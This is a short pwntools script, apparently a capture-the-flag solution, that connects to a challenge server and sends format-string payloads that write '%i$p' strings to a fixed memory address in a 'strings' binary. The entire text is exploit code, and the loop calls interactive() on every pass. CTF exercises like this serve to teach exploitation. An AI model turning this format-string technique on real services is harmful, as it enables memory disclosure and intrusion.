from pwn import *

elf = context.binary = ELF("strings")

p = remote("challs.n00bzunit3d.xyz", 7150)

offset = 6

for i in range(1,100):
    writes = {0x00404060: f"%{i}$p".encode()}
    payload = fmtstr_payload(6, writes)

    p.sendline(payload)
    p.interactive()